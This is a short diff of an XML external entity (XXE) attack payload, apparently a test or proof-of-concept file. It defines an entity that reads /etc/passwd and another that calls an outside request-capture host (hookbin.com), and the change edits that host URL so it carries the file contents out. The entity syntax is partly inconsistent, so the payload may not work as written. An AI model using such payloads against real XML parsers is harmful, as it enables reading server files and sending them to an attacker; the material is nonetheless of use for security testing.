@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE root[
   <!ENTITY c SYSTEM "/etc/passwd">
-  <!ENTITY callhome SYSTEM "https://hookbin.com/bin/v0PP33lP?%xxe;">
+  <!ENTITY callhome SYSTEM "https://hookbin.com/bin/v0PP33lP?%c;">
 ]>
 <name>&c;</name>
